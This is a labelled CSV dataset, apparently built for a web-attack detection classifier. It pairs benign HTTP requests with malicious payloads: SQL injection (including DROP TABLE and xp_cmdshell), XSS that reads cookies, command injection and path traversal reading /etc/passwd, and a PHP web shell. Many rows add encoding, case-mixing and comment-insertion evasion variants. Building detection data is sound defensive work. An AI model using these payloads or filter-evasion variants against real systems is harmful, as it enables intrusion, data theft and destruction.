request_string,label,technique,base_sample_id
POST /api/v1/user/profile name=John+Doe&email=john@example.com,0,raw,ben_raw_0001
GET /search?q=laptop&category=electronics HTTP/1.1,0,raw,ben_raw_0002
POST /contact message=Hello+support+team HTTP/1.1,0,raw,ben_raw_0003
GET /assets/style.css HTTP/1.1,0,raw,ben_raw_0004
GET /images/logo.png HTTP/1.1,0,raw,ben_raw_0005
POST /settings theme=dark&notifications=true HTTP/1.1,0,raw,ben_raw_0006
POST /checkout item_id=402&quantity=1&payment=card,0,raw,ben_raw_0007
POST /feedback rating=5&comments=Great+service HTTP/1.1,0,raw,ben_raw_0008
GET /download/report.pdf HTTP/1.1,0,raw,ben_raw_0009
POST /login username=admin&password=Password123!,0,raw,ben_raw_0010
GET /products?page=2&sort=asc HTTP/1.1,0,raw,ben_raw_0011
GET /api/status HTTP/1.1,0,raw,ben_raw_0012
GET /index.html HTTP/1.1,0,raw,ben_raw_0013
GET /blog/posts/security-best-practices HTTP/1.1,0,raw,ben_raw_0014
GET /about-us HTTP/1.1,0,raw,ben_raw_0015
' OR '1'='1,1,raw,mal_0001
"<iframe src=""javascript:alert('XSS')"">",1,raw,mal_0002
'; DROP TABLE users; --,1,raw,mal_0003
'; EXEC xp_cmdshell('dir');--,1,raw,mal_0004
1' HAVING 1=1--,1,raw,mal_0005
<svg onload=alert(document.cookie)>,1,raw,mal_0006
admin' --,1,raw,mal_0007
<img src=x onerror=alert(1)>,1,raw,mal_0008
| cat /etc/passwd,1,raw,mal_0009
<?php system($_GET['cmd']); ?>,1,raw,mal_0010
<script>alert('XSS')</script>,1,raw,mal_0011
"1 UNION SELECT null, username, password FROM users--",1,raw,mal_0012
"1' AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables--",1,raw,mal_0013
../../../../etc/passwd,1,raw,mal_0014
' OR 1=1#,1,raw,mal_0015
%27%20OR%20%271%27%3D%271,1,url_encode_full,mal_0001
' Or '1'='1,1,case_mixing,mal_0001
'/**/O/**/R/**/'1'='1,1,sql_comment_injection,mal_0001
%2527%2520OR%2520%25271%2527%253D%25271,1,double_encoding,mal_0001
%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1,url_encode_full,mal_0002
%3Ciframe%20src%3D%22javascript:alert%28%27XSS%27%29%22%3E,1,url_encode_partial,mal_0002
"<iFrAmE SrC=""jAvAsCrIpT:AlErT('xSs')"">",1,case_mixing,mal_0002
"<iframe/**/src=""javaSCR/**/IPT:AL/**/ERT('XSS')"">",1,sql_comment_injection,mal_0002
%253Ciframe%2520src%253D%2522javascript%253Aalert%2528%2527XSS%2527%2529%2522%253E,1,double_encoding,mal_0002
%27%3B%20DROP%20TABLE%20users%3B%20--,1,url_encode_full,mal_0003
'; dRoP TaBlE UsErS; --,1,case_mixing,mal_0003
';/**/DR/**/OP/**/TABLE/**/users;/**/--,1,sql_comment_injection,mal_0003
%2527%253B%2520DROP%2520TABLE%2520users%253B%2520--,1,double_encoding,mal_0003
%27%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%3B--,1,url_encode_full,mal_0004
'; eXeC Xp_cMdShElL('dIr');--,1,case_mixing,mal_0004
';/**/EXEC/**/xp_cmdshell('dir');--,1,sql_comment_injection,mal_0004
%2527%253B%2520EXEC%2520xp_cmdshell%2528%2527dir%2527%2529%253B--,1,double_encoding,mal_0004
1%27%20HAVING%201%3D1--,1,url_encode_full,mal_0005
1' hAvInG 1=1--,1,case_mixing,mal_0005
1'/**/HAVING/**/1=1--,1,sql_comment_injection,mal_0005
1%2527%2520HAVING%25201%253D1--,1,double_encoding,mal_0005
%3Csvg%20onload%3Dalert%28document.cookie%29%3E,1,url_encode_full,mal_0006
<sVg oNlOaD=AlErT(DoCuMeNt.cOoKiE)>,1,case_mixing,mal_0006
<svg/**/onload=AL/**/ERT(document.cookie)>,1,sql_comment_injection,mal_0006
%253Csvg%2520onload%253Dalert%2528document.cookie%2529%253E,1,double_encoding,mal_0006
admin%27%20--,1,url_encode_full,mal_0007
AdMiN' --,1,case_mixing,mal_0007
admin'/**/--,1,sql_comment_injection,mal_0007
admin%2527%2520--,1,double_encoding,mal_0007
%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1,url_encode_full,mal_0008
<iMg sRc=x oNeRrOr=aLeRt(1)>,1,case_mixing,mal_0008
